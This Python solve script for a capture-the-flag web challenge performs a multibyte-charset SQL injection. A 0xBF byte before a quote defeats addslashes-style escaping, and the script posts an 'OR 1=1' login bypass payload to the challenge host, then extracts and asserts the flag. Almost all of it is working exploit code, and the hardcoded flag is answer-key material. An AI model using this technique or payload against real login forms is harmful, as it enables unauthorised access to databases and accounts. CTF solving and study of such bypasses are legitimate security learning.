"""Make a Wish / "we escaped all special characters" (Pink CTF, Web): multibyte addslashes bypass.

The login escapes quotes the mysql/addslashes way: ' -> \'  (prefix 0x5C). But the DB connection
uses a multibyte charset (GBK-style), where 0xBF 0x5C is ONE character. So sending the raw byte
0xBF right before our quote makes the escaper's backslash get swallowed into a multibyte char,
leaving our 0x27 quote live. That breaks us out of the username string literal.

Usage: python solve.py            (hits https://sqli.pink.bayern/)
"""
import re
import sys
import urllib.request

URL = "https://sqli.pink.bayern/"


def post_raw(body: bytes) -> str:
    req = urllib.request.Request(URL, data=body, headers={"Content-Type": "application/x-www-form-urlencoded"})
    return urllib.request.urlopen(req, timeout=30).read().decode("utf-8", "replace")


# username = 0xBF 0x27(') OR 1=1 -- -   ; the 0xBF eats the escaper's 0x5C, freeing the quote.
payload = b"username=%BF%27%20OR%201=1--%20-&password=x"
html = post_raw(payload)

m = re.search(r"PINK\{[^}]*\}", html)
print(m.group(0) if m else "no flag; response:\n" + html[:500])
assert m, "injection failed"
assert m.group(0) == "PINK{0x5C_is_not_always_a_backslash}"

# Proof it is a real bypass and not a guessed password: a false condition is still denied.
false_html = post_raw(b"username=%BF%27%20OR%201=2--%20-&password=x")
assert "PINK{" not in false_html and "denied" in false_html.lower(), "no boolean difference -> not injection"
print("verified: `OR 1=1` grants access, `OR 1=2` is denied", file=sys.stderr)
